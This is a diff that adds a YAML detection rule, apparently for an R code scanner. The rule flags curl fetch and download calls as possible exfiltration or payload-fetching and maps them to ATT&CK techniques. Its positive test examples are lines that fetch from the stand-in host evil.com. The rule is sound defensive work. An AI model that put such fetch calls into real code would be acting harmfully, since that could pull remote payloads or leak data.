@@ -1,0 +1,45 @@
+name: curl_pattern
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+  A curl network call sends an outbound HTTP request. A request may be used to
+  exfiltrate credentials or other data, or to fetch a remote payload.
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'curl_fetch_memory' or text() = 'curl_fetch_disk' or
+      text() = 'curl_fetch_stream' or text() = 'curl_download' or
+      text() = 'multi_run'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    curl_fetch_memory("https://evil.com/evil")
+  - |
+    curl::curl_fetch_memory("https://evil.com/evil")
+  - |
+    curl_fetch_disk("https://evil.com/evil", tempfile())
+  - |
+    curl::curl_fetch_disk("https://evil.com/evil", tempfile())
+  - |
+    curl_fetch_stream("https://evil.com/evil", callback)
+  - |
+    curl::curl_fetch_stream("https://evil.com/evil", callback)
+  - |
+    curl_download("https://evil.com/evil", destfile = tempfile())
+  - |
+    curl::curl_download("https://evil.com/evil", destfile = tempfile())
+  - |
+    multi_run()
+  - |
+    curl::multi_run()
+negative_examples:
+  - |
+    foo$curl_download("https://example.com/x")
+  - |
+    foo@curl_fetch_memory("https://example.com/x")
